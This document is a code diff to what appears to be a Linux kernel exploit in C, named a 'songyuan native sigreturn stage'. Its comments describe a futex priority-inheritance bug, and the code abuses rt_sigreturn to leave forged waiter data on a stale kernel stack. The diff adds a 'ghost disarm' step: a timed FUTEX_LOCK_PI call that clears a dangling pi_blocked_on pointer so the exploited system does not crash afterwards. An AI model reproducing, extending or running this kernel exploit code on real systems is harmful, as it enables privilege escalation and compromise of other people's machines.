@@ -54,6 +54,10 @@ static atomic_int native_waiter_waiting;
 static atomic_int native_owner_started;
 static atomic_int native_consumer_go;
 static atomic_int native_consumer_done;
+static atomic_int native_disarm_done;
+static atomic_int native_disarm_errno;
+static atomic_int native_disarm_result;
+static pid_t native_process_pid;
 static unsigned char native_payload[FPSIMD_VREGS_SIZE];
 static volatile sig_atomic_t native_handler_ok;
 
@@ -127,10 +131,31 @@ static void *native_waiter_thread(void *unused) {
   }
 
   /* rt_sigreturn has completed, leaving the forged bytes parked in this
-   * thread's now-stale kernel stack.  Do not make another syscall here. */
+   * thread's now-stale kernel stack.  Keep that stack intact until the
+   * consumer has finished walking the forged waiter. */
   atomic_store(&native_consumer_go, 1);
-  for (;;)
+  while (!atomic_load(&native_consumer_done))
     __asm__ volatile("yield" ::: "memory");
+
+  /* remove_waiter() operated on current instead of waiter->task and left
+   * this thread's task_struct->pi_blocked_on pointing into the stale futex
+   * frame.  Exiting the worker with that ghost still armed makes a later
+   * scheduler PI walk dereference reclaimed stack data.  Force one final
+   * timed slow-path removal on this same thread while the stamped frame is
+   * still resident; the rollback clears pi_blocked_on before any teardown.
+   *
+   * native_process_pid was captured before arming the bug so this block's
+   * first syscall is the disarm operation itself. */
+  uint32_t dummy_pi = 0x80000000U | (uint32_t)native_process_pid;
+  const struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
+  errno = 0;
+  long disarm = syscall(SYS_futex, &dummy_pi, FUTEX_LOCK_PI, 0,
+                        &expired, NULL, 0);
+  int disarm_errno = errno;
+  atomic_store(&native_disarm_result, (int)disarm);
+  atomic_store(&native_disarm_errno, disarm_errno);
+  atomic_store(&native_disarm_done, 1);
+  return NULL;
 }
 
 static void *native_owner_thread(void *unused) {
@@ -185,6 +210,10 @@ int songyuan_native_sigreturn_stage(const uint64_t *buffer) {
   atomic_store(&native_owner_started, 0);
   atomic_store(&native_consumer_go, 0);
   atomic_store(&native_consumer_done, 0);
+  atomic_store(&native_disarm_done, 0);
+  atomic_store(&native_disarm_errno, 0);
+  atomic_store(&native_disarm_result, 0);
+  native_process_pid = getpid();
   memset(native_payload, 0, sizeof(native_payload));
   memcpy(native_payload + SIGRETURN_WAITER_OFF, buffer, PAYLOAD_BYTES);
 
@@ -232,6 +261,21 @@ int songyuan_native_sigreturn_stage(const uint64_t *buffer) {
     usleep(1000);
   if (!atomic_load(&native_consumer_done)) {
     pr_warning("native stage: consumer timed out\n");
+    return 1;
+  }
+  for (int i = 0; i < 10000 && !atomic_load(&native_disarm_done); i++)
+    usleep(1000);
+  if (!atomic_load(&native_disarm_done)) {
+    pr_warning("native stage: ghost disarm timed out\n");
+    return 1;
+  }
+  int disarm = atomic_load(&native_disarm_result);
+  int disarm_errno = atomic_load(&native_disarm_errno);
+  pr_info("native stage: ghost disarm ret=%d errno=%d\n",
+          disarm, disarm_errno);
+  if (disarm != -1 || disarm_errno != ETIMEDOUT) {
+    pr_warning("native stage: ghost disarm unexpected ret=%d errno=%d\n",
+               disarm, disarm_errno);
     return 1;
   }
   return 0;
